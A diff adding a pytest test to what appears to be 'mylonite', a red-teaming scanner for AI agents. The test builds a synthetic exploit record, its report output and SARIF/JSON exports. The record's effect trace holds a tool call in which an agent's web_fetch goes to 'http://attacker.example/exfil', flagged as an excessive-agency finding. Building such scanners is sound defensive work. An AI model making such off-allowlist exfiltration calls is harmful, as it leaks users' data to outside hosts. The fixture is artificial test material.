@@ -2663,6 +2663,116 @@ def test_report_scan_dir_renders_panel(tmp_path: Path) -> None:
     assert "findings" in result.output.lower()
 
 
+def test_report_renders_structural_recommendation_for_a_custom_target(tmp_path: Path) -> None:
+    """PR7 end-to-end: a scan dir with a co-located target.yaml (written by
+    `scan` for any custom target) and a tool_surface.json sidecar (PR7) makes
+    `mylonite report` reconstruct a TargetContext and render the structural
+    recommendation panel — and carry it into --sarif/--json too, all via the
+    same recommend()/to_dict() the panel used, so terminal/SARIF/bundle agree."""
+    import json as _json
+
+    from mylonite.contracts._types import (
+        AdapterResponse,
+        ComplianceTags,
+        ExploitRecord,
+        Payload,
+        ScanAttempt,
+        ScanReport,
+    )
+
+    scan_dir = tmp_path / "scan"
+    scan_dir.mkdir()
+
+    (scan_dir / "target.yaml").write_text(
+        "family: myapp\ncommand: python\nargs: [server.py]\n", encoding="utf-8"
+    )
+    (scan_dir / "tool_surface.json").write_text(
+        _json.dumps(
+            {
+                "schema_version": "1.0",
+                "target_id": "mcp:myapp",
+                "tools": [{"name": "web_fetch", "description": "Fetch a URL.", "json_schema": {}}],
+            }
+        ),
+        encoding="utf-8",
+    )
+
+    pid = "fetch-w3"
+    exploit = ExploitRecord(
+        target_id="mcp:myapp",
+        pattern_id=pid,
+        payload=Payload(
+            pattern_id=pid, channel="user-message", body="x", metadata={"weakness": "W3"}
+        ),
+        response=AdapterResponse(
+            payload_pattern_id=pid,
+            raw_response="fetched",
+            tool_calls=["web_fetch"],
+            metadata={
+                "effect_trace": _json.dumps(
+                    [
+                        {
+                            "tool": "web_fetch",
+                            "args": {"url": "http://attacker.example/exfil"},
+                            "result": "ok",
+                            "is_error": False,
+                        }
+                    ]
+                )
+            },
+        ),
+        success_reason="fetched an off-allowlist destination",
+        compliance=ComplianceTags(owasp_asi=["ASI05"]),
+    )
+    (scan_dir / f"exploit_{pid}.json").write_text(
+        _json.dumps(exploit.model_dump(mode="json"), indent=2, sort_keys=True), encoding="utf-8"
+    )
+    report = ScanReport(
+        target_id="mcp:myapp",
+        attack_modules=["mylonite.excessive-agency"],
+        provider="anthropic",
+        model="synthetic-model",
+        elapsed_seconds=0.1,
+        attempts=[
+            ScanAttempt(
+                seed_id=pid,
+                pattern_id=pid,
+                outcome="finding",
+                verdict_mechanism="predicate",
+                verdict_reason="fetched off-allowlist",
+                error_detail=None,
+            )
+        ],
+        findings_count=1,
+        aborted=None,
+        single_run=True,
+        mylonite_version="0.0.0-test",
+    )
+    (scan_dir / "scan_report.json").write_text(
+        report.model_dump_json(indent=2) + "\n", encoding="utf-8"
+    )
+
+    result = runner.invoke(app, ["report", str(scan_dir)])
+    assert result.exit_code == EXIT_SUCCESS, result.output
+    assert "recommended controls" in result.output
+    assert "web_fetch" in result.output
+    assert "deterministic" in result.output
+
+    sarif_path = tmp_path / "out.sarif"
+    json_path = tmp_path / "out.json"
+    result = runner.invoke(
+        app, ["report", str(scan_dir), "--sarif", str(sarif_path), "--json", str(json_path)]
+    )
+    assert result.exit_code == EXIT_SUCCESS, result.output
+    sarif_doc = _json.loads(sarif_path.read_text())
+    bundle_doc = _json.loads(json_path.read_text())
+    sarif_rec = sarif_doc["runs"][0]["results"][0]["properties"]["mylonite.recommendation"]
+    bundle_rec = bundle_doc["findings"][0]["recommendation"]
+    assert sarif_rec == bundle_rec  # SARIF and the bundle must agree exactly
+    assert sarif_rec["weakness_class"] == "W3"
+    assert sarif_rec["evidence"][0]["tool"] == "web_fetch"
+
+
 def test_report_scan_console_output_redacts_secret_shaped_verdict_reason(tmp_path: Path) -> None:
     """Spec-compliance follow-up (Important #1): `mylonite report` used to render
     `render_summary()`'s output via a bare `console.print(...)` with NO redaction,
